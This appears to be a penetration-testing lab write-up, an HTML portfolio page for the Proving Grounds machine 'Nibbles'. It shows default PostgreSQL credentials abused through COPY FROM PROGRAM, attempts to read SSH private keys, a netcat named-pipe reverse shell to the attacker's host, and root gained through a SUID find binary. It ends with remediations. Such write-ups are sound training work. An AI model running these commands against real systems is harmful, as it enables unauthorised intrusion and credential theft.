@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Walkthrough: PG -Nibbles</title>
+  <link rel="preconnect" href="https://googleapis.com" />
+  <link rel="preconnect" href="https://gstatic.com" crossorigin />
+  <link href="https://googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0d0d0f;
+      --surface:   #141417;
+      --surface2:  #1a1a1f;
+      --border:    #2a2a32;
+      --text:      #e8e8ec;
+      --muted:     #6b6b78;
+      --subtle:    #9898a8;
+      --accent:    #7c6af7;
+      --accent-bg: #1a1730;
+      --green:     #4ade80;
+      --green-bg:  #0d2318;
+      --amber:     #fbbf24;
+      --amber-bg:  #221a00;
+      --red:       #f87171;
+      --red-bg:    #220d0d;
+      --mono:      'JetBrains Mono', monospace;
+      --sans:      'Inter', sans-serif;
+      --radius:    6px;
+    }
+
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg:        #f8f8fa;
+        --surface:   #ffffff;
+        --surface2:  #f1f1f5;
+        --border:    #e0e0e8;
+        --text:      #111118;
+        --muted:     #9090a0;
+        --subtle:    #555560;
+        --accent:    #5b4de0;
+        --accent-bg: #eeecff;
+        --green:     #16a34a;
+        --green-bg:  #dcfce7;
+        --amber:     #b45309;
+        --amber-bg:  #fef3c7;
+        --red:       #dc2626;
+        --red-bg:    #fee2e2;
+      }
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 14px;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .site {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    /* NAV */
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 3rem;
+    }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+    }
+
+    .nav-brand .accent { color: var(--accent); }
+
+    .nav-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .nav-links a {
+      font-size: 13px;
+      color: var(--subtle);
+    }
+
+    .nav-links a:hover {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    /* POST HEADERS & NARRATIVE */
+    .post-header { margin-bottom: 2.5rem; }
+    
+    .eyebrow {
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-header h1 {
+      font-family: var(--sans);
+      font-size: 36px;
+      font-weight: 500;
+      color: var(--text);
+      line-height: 1.2;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-meta {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 1.5rem;
+    }
+
+    .diff {
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 500;
+    }
+    .diff-easy { background: var(--green-bg); color: var(--green); }
+    .diff-med  { background: var(--amber-bg); color: var(--amber); }
+    .diff-hard { background: var(--red-bg);   color: var(--red);   }
+
+    p { font-family: var(--sans); color: var(--subtle); margin-bottom: 1.25rem; font-size: 14px; }
+    p em { color: var(--muted); }
+    p strong { color: var(--text); }
+
+    h2 {
+      font-family: var(--sans);
+      font-size: 20px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 3rem 0 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h3 {
+      font-family: var(--sans);
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 1.5rem 0 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* 0xdf SPECIFIC COMPONENT STYLES */
+    .summary-box {
+      background: var(--surface);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      padding: 1.25rem;
+      margin-bottom: 2rem;
+    }
+    .summary-box p { margin-bottom: 0; }
+
+    ul {
+      margin-bottom: 1.5rem;
+      padding-left: 1.25rem;
+    }
+    li {
+      font-family: var(--sans);
+      color: var(--subtle);
+      font-size: 14px;
+      margin-bottom: 0.5rem;
+    }
+    li strong { color: var(--text); }
+
+    /* CODE BLOCKS */
+    code {
+      font-family: var(--mono);
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13px;
+      color: var(--text);
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 1.25rem;
+      border-radius: var(--radius);
+      overflow-x: auto;
+      margin-bottom: 1.5rem;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .prompt-symbol { color: var(--accent); font-weight: bold; }
+    .output-muted { color: var(--muted); }
+    .output-highlight { color: var(--green); }
+
+    /* IMAGES */
+    .screenshot {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 6px;
+      max-width: 100%;
+      height: auto;
+      margin: 1.5rem 0;
+      display: block;
+    }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--border);
+      padding-top: 1.5rem;
+      margin-top: 5rem;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="site">
+    <!-- Keep your identical portfolio navigation bar -->
+    <nav>
+      <div class="nav-brand"><span class="accent">~/</span>ajith-g-nayak</div>
+      <div class="nav-links">
+        <a href="../index.html#about">about</a>
+        <a href="../index.html#writeups">writeups</a>
+        <a href="../index.html#projects">projects</a>
+        <a href="../index.html#run-throughs">run-throughs</a>
+        <a href="https://github.com/ajithor" target="_blank" rel="noopener">github</a>
+      </div>
+    </nav>
+
+    <!-- Post Metadata Section -->
+    <header class="post-header">
+      <div class="eyebrow">Proving Grounds Walkthrough</div>
+      <h1>Nibbles</h1>
+      <div class="post-meta">
+        <span>July 23, 2026</span>
+        <span>•</span>
+        <span class="diff diff-med">Medium</span>
+        <span>•</span>
+        <span>Target IP: 192.168.x.47</span>
+      </div>
+    </header>
+
+    <div class="summary-box">
+      <p><strong>Summary:</strong> Machine starts with an open posgresql port, which has default <code>postgres:postgres</code> login enabled, while retaining the Superuser functionality. This is exploited to trigger a reverse shell. A binary with SUID is then exploited to gain root access to the system.</p>
+    </div>
+
+    <h3>Attack Chain</h3>
+    <ul>
+      <li><strong>Foothold:</strong> Port 5437 Postgresql -> OS command execution -> Low-Privilege Shell</li>
+      <li><strong>PrivEsc (Root):</strong> SUID Exploitation (<code>/usr/bin/find</code>) -> Namespace Escape</li>
+    </ul>
+
+    <h2>Reconnaissance</h2>
+    <p>I will start my analysis by launching an <code>nmap</code> scan against the target machine to discover accessible ports:</p>
+    
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/nibbles]
+└─$</span> sudo nmap -Pn -sV -vv 192.168.186.47 -p- --open 
+PORT     STATE SERVICE    REASON         VERSION
+21/tcp   open  ftp        syn-ack ttl 61 vsftpd 3.0.3
+22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http       syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
+5437/tcp open  postgresql syn-ack ttl 61 PostgreSQL DB 11.3 - 11.9
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+    
+    <p>Reviewing the nmap scans highlights a few ports and services. 
+    It is a good idea to prioritize the enumeration of low-hanging fruits, viz <code>port 21 FTP</code> first, then <code>port 5437 postgresql</code> next.
+    Then <code>port 80 web</code> mannual enumeration and directories enumeration. If nothing is found, resort to brute-force ssh as a worst-case scenario</p>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/nibbles]
+└─$</span> ftp 192.168.186.47 
+Connected to 192.168.186.47.
+220 (vsFTPd 3.0.3)
+Name (192.168.186.47:kali): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed</code></pre>
+
+<p> We try anonymous ftp login, and discover it has been locked down. Moving on to the next item on list, <code>port 5437 postgresql</code></p>
+
+<h2>Foothold</h2>
+    <p>We can use the <code>psql</code> command to initially try authenticating with default superuser <code>postgres</code> and default passwords like <code>postgres</code>,<code>password</code>, etc - the usuals.</p>
+    
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/nibbles]
+└─$</span> psql -h 192.168.186.47 -p 5437 -U postgres -W
+Password: 
+psql (18.1 (Debian 18.1-2), server 11.7 (Debian 11.7-0+deb10u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
+Type "help" for help.
+
+postgres=# \du
+                             List of roles
+ Role name |                         Attributes                         
+-----------+------------------------------------------------------------
+ postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS
+
+postgres=#</code></pre>
+
+<p>We authenticate as user <code>postgres</code> and password <code>postgres</code> to port <code>5437</code>. Once the authentication is successful, we can list all users and the associated roles they have with <code>\du</code>. This helps us establish that the compromised <code>postgres</code> has <code>Superuser</code> attributes.</p>
+<p>Hackviser has a detailed <a href="https://hackviser.com/tactics/pentesting/services/postgresql#command-execution-via-copy">article</a> on Pentesting Postgresql, where they show how <code>COPY FROM</code> functionality can be exploited for File operations and Code execution.</p>
+<p>Essentially, we need to create a table for the command output, and use the <code>COPY FROM</code> functionality to execute code, which copies the output of the code into the table, which we can subsequently read by a simple <code>SELECT</code> database command</p>
+
+<p>But first, we need to find a database and connect to it. We can list the databases using the <code>\list</code>, and then use the <code>\connect db_name</code> to connect to it. In this instance, we connect to the default database, <code>postgres</code></p> 
+
+<pre><code>postgres=# \list
+                                                     List of databases
+   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
+-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
+ postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
+ template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
+           |          |          |                 |             |             |        |           | postgres=CTc/postgres
+ template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
+           |          |          |                 |             |             |        |           | postgres=CTc/postgres
+(3 rows)
+
+postgres=# \connect postgres;
+Password: 
+psql (18.1 (Debian 18.1-2), server 11.7 (Debian 11.7-0+deb10u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
+You are now connected to database "postgres" as user "postgres".
+postgres=#</code></pre>
+
+<p>Now, we just need to create a table of text datatype to store the command outputs, using the <code>create table cmd_results (DATA text);</code> command. At this stage, we can test command execution.</p>
+<p>For linux-based operating systems, ideally we start with the identity of the user, then check other users in <code>/etc/passwd</code>, and think of trying to get their <code>id_rsa</code>, or writing a reverse shell into the victim and triggering it. And for Windows-based systems, we start with identity, <code>C:\Windows\win.ini</code> and write a netcat executable, and trigger a reverse shell.</p>
+
+<p>Command execution can be done using postgresql's <code>COPY/ FROM PROGRAM</code> functionalities like so -</p>
+
+<pre><code>postgres=# COPY cmd_results FROM PROGRAM 'whoami';
+COPY 1
+postgres=# select * from cmd_results;
+   data   
+----------
+ postgres
+(1 row)
+postgres=# COPY cmd_results FROM PROGRAM 'cat /etc/passwd|grep sh$';
+COPY 3
+postgres=# select * from cmd_results;
+                                           data                                            
+-------------------------------------------------------------------------------------------
+ postgres
+ root:x:0:0:root:/root:/bin/bash
+ wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
+ postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+(4 rows)</code></pre>
+
+<p>We can gather from the results, that the current user is <code>postgres</code>, and there is one other non-root-user, <code>wilson</code>. We can start to steal their <code>id_rsa</code>, but as you will see, the <code>postgres</code> user doesnt have the rights to get them.</p>
+
+<pre><code>postgres=# COPY cmd_results FROM PROGRAM 'cat /root/.ssh/id_rsa';
+ERROR:  program "cat /root/.ssh/id_rsa" failed
+DETAIL:  child process exited with exit code 1
+postgres=# COPY cmd_results FROM PROGRAM 'cat /home/wilson/.ssh/id_rsa';
+ERROR:  program "cat /home/wilson/.ssh/id_rsa" failed
+DETAIL:  child process exited with exit code 1
+postgres=# COPY cmd_results FROM PROGRAM 'cat /home/postgres/.ssh/id_rsa';
+ERROR:  program "cat /home/postgres/.ssh/id_rsa" failed
+DETAIL:  child process exited with exit code 1
+postgres=# select * from cmd_results;
+ data 
+------
+(0 rows)
+
+postgres=#</code></pre>
+<p>So the next logical step is to write a reverse shell into the victim, and trigger it. I like to use a named pipe reverse shell, over the netcat binary, since you arent always gaurenteed the netcat version supports the <code>-e</code> option. Start the netcat listener, write the reverse shell file, and trigger it!</p>
+
+<pre><code>postgres=# COPY cmd_results FROM PROGRAM 'echo "mkfifo /tmp/f; nc 192.168.45.236 22 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f" > /dev/shm/rev_shell.sh';
+COPY 0
+postgres=# COPY cmd_results FROM PROGRAM 'chmod +x /dev/shm/rev_shell.sh; bash /dev/shm/rev_shell.sh';</code></pre>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/nibbles]
+└─$</span> rlwrap -cAr nc -lvnp 22 
+listening on [any] 22 ...
+connect to [192.168.45.236] from (UNKNOWN) [192.168.176.47] 48006
+whoami
+postgres
+which python
+/usr/bin/python
+python -c 'import pty; pty.spawn("/bin/bash")';
+<span class="prompt-symbol">postgres@nibbles:/var/lib/postgresql/11/main$</span></code></pre>
+
+<p>The local flag can be found in <code>winson</code>'s home</p>
+<pre><code><span class="prompt-symbol">postgres@nibbles:/var/lib/postgresql$</span> cd /home/wilson
+cd /home/wilson
+<span class="prompt-symbol">postgres@nibbles:/home/wilson$</span> ls
+ls
+ftp  local.txt
+<span class="prompt-symbol">postgres@nibbles:/home/wilson$</span> wc local.txt
+wc local.txt
+ 1  1 33 local.txt</code></pre>
+
+    <h2>Privilege Escalation</h2>
+    <p>Now that we have the local user flag, we can proceed with regular privesc mannual checks, like <code>sudo -l</code>, checking any strange files with SUID bits set, crontabs, exports, capabilities, internal ports, groups, writable directories in <code>$PATH</code>, any unusual file is <code>/opt</code>, running processes, groups, etc. Then we can proceed to more advanced ones. Always a good idea to cover the basics mannually, with a checklist, because it is easy to forget or miss simple things.</p>
+    <p>Upon checking for binaries with SUID bits set, we find an unusual one, <code>find</code>. It is a logical next step to then check <a href="https://gtfobins.org/">GTFObins</a> for a privesc breakout.</p>
+    <pre><code><span class="prompt-symbol">postgres@nibbles:/home/wilson$</span> find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
+   137358     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+    19052    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+    15602     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      282     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+      286     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+      285     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+      283     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+    34845     36 -rwsr-xr-x   1 root     root          34896 Jan  7  2019 /usr/bin/fusermount
+     3838     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+      261     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+     4071     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+     2248    312 -rwsr-xr-x   1 root     root         315904 Feb 16  2019 /usr/bin/find
+    22663    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
+     4073     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount </code> </pre>
+
+     <p>The section on <a href="https://gtfobins.org/gtfobins/find/">gtfobins find</a> shows how the inbuild <code>exec</code> option of the <code>find</code> command can be used to invoke a shell, and because of the SUID, the context of the shell invoke is by root, hence escalation of privilege.</p>
+
+     <pre><code><span class="prompt-symbol">postgres@nibbles:/home/wilson$</span> find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# whoami
+whoami
+root
+# wc -c /root/proof.txt
+wc -c /root/proof.txt
+33 /root/proof.txt </code> </pre>
+
+<h2>Remidiations</h2>
+<ul>
+  <li>Restrict the access of Postgresql to Localhost, unless explicitly required to be accessible from external networks.</li>
+  <li>Revoke the Superuser permissions for the default SuperUser postgres, unless explicitly required</li>
+  <li>The password for db user postgres should be a randomly generated long string. Do not use weak passwords that are consistent with weak password policies.</li>
+  <li>The find command should not have SUID set for all users.</li>
+</ul>
+
+</div>
+</body>
+</html>
